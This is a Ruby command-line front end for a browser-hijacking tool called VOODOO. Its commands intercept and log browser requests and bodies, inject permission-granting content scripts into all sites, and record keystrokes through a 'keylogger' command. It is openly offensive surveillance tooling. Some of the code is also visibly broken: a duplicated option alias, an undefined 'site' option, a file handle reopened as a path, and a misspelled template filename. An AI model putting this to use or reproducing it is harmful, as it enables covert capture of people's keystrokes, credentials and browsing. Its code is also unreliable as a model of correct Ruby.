require 'thor'
require 'json'
require 'yaml'
require 'voodoo/browser'

module VOODOO

    VERSION = 'v0.0.1'

    class CLI < Thor

        desc 'version', 'Prints voodoo version'
        def version
            puts VERSION
        end
        
        option :url_include, :type => :string, :aliases => :u, :default => nil
        option :body_include, :type => :string, :aliases => :b, :default => nil
        option :header_exists, :type => :string, :aliases => :h, :default => nil
        option :output, :type => :string, :aliases => :o, :default => 'stdout',:desc => '<path>, stdout'
        option :urls, :type => :array, :aliases => :x, :default => []
        option :matches, :type => :array, :aliases => :m, :default => ['<all_urls>']
        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
        desc 'intercept', 'intercept browser requests'
        def intercept
            browser = get_browser options[:browser]
            
            output = options[:output]

            if output != 'stdout'
                output = open(output, 'a')
            end

            browser.intercept(matches: options[:matches],
                              url_include: options[:url_include],
                              body_include: options[:body_include]) do |event|
                req = event[:payload]
                
                if output != 'stdout'
                    output.puts JSON.generate(req)
                    output.close
                    output = open(output, 'a')
                else
                    puts "#{req[:method]} #{req[:url]}"
                    if req[:body]
                        body = req[:body]
                        if body.length > 100
                            body = body[0...97] + '...'
                        end
                        puts "BODY: #{body}"
                    end
                end
            end

            browser.hijack url: options[:site]
        end

        option :urls, :type => :array, :aliases => :x, :default => []
        option :output, :type => :string, :aliases => :o, :desc => '<path>, stdout', :default => nil
        option :js_vars, :type => :hash,:aliases => :j, :desc => 'localizes JavaScript variable', :default => {}
        option :matches, :type => :array, :aliases => :m, :default => ['*://*/*']
        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
        option :permissions, :type => :array, :aliases => :p, :default => []
        desc 'script <js/path>', 'add a content script'
        def script(path_or_js)
            browser = get_browser options[:browser]
            browser.add_permissions options[:permissions]

            output = options[:output]

            if output != nil && output != 'stdout'
                output = open(output, 'a')
            end

            if File.exists? path_or_js
                if output != nil
                    browser.add_script file: path_or_js, options: options[:js_vars] do |event|
                        if output != 'stdout'
                            output.puts JSON.generate(event)
                        else
                            puts "#{event[:origin]}: #{event[:payload]}"
                        end
                    end
                else
                    browser.add_script file: path_or_js, options: options[:js_vars]
                end
            else
                if output != nil
                    browser.add_script content: path_or_js, options: options[:js_vars] do |event|
                        if output != 'stdout'
                            output.puts JSON.generate(event)
                        else
                            puts "[+] #{event[:origin]} => #{event[:payload]}"
                        end
                    end
                else
                    browser.add_script content: path_or_js, options: options[:js_vars]
                end
            end

            browser.hijack url: options[:site]
        end
        
        option :urls, :type => :array, :aliases => :x, :default => []
        option :output, :type => :string, :aliases => :o, :default => 'stdout', :desc => '<path>, stdout'
        option :matches, :type => :array, :aliases => :m, :default => ['*://*/*']
        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
        desc 'keylogger', 'records user keystrokes'
        def keylogger
            browser = get_browser options[:browser]
            output = options[:output]

            if output != 'stdout'
                output = open(output, 'a')
            end

            browser.keylogger(matches: options[:matches]) do |event|
                if output != 'stdout'
                    output.puts JSON.generate(event)
                else
                    print event[:payload][:log]
                end
            end

            browser.hijack url: options[:site]
        end

        option :browser, :type => :string, :aliases => :b, :default => nil
        option :output, :type => :string, :aliases => :o, :default => 'none', :desc => 'none, <path>, stdout, stdout:payload'
        option :urls, :type => :array, :aliases => :x, :default => []
        option :js_vars, :type => :hash,:aliases => :j, :desc => 'localizes JavaScript variable', :default => {}
        desc 'template <path>', 'execute a VOODOO template'
        def template(path)
            pwd = Dir.pwd
            output = options[:output]

            if File.directory? path
                pwd = File.expand_path File.join(pwd, path)
                template = YAML.load_file(File.join(path, 'voodoo.ymal'))
            else
                pwd = File.expand_path File.join(pwd, File.dirname(path))
                template = YAML.load_file(path)
            end

            template = YAML.load_file(path)

            if output == 'none' && template['output']
                output = template['output']
            end

            browser_inst = template['browser'] || {}

            browser = get_browser(options[:browser] || browser_inst['name'] || 'chrome')

            if template['permissions']
                browser.add_permissions template['permissions']
            end
                
            if !['stdout', 'stdout:payload', 'none'].include? output
                output = open(output, 'a')
            end

            template['scripts'].each do |script| 
                file = File.expand_path(File.join(pwd, script['file'])) if script['file']
                content = script['content']
                matches = script['matches']
                js_vars = options[:js_vars]
                background = script['background'] || false
                
                if output != 'none'
                    browser.add_script(matches: matches, file: file, content: content, options: js_vars, background: background) do |event|
                    case output
                        when 'stdout'
                            puts JSON.generate(event)
                        when 'stdout:payload'
                            puts JSON.generate(event[:payload])
                        else
                            output.puts JSON.generate(event)
                        end
                    end
                else
                    browser.add_script(matches: matches,content: content, options: js_vars, background: background)
                end
            end

            urls = options[:urls]

            if urls.length == 0 && browser_inst['urls']
                urls = browser_inst['urls']
            end

            browser.hijack urls.uniq
        end

        def self.exit_on_failure?
            true
        end

        private

        def get_browser(name)
            browser = nil
            
            case name.downcase
                when 'chrome'
                    browser = Browser.Chrome
                when 'chromium'
                    browser = Browser.Chromium
                when 'opera'
                    browser = Browser.Opera
                when 'edge'
                    browser = Browser.Edge
                when 'brave'
                    browser = Browser.Brave
            end

            if browser == nil
                raise StandardError.new "Unsupported browser \"#{name}\""
            end

            return browser
        end

    end

end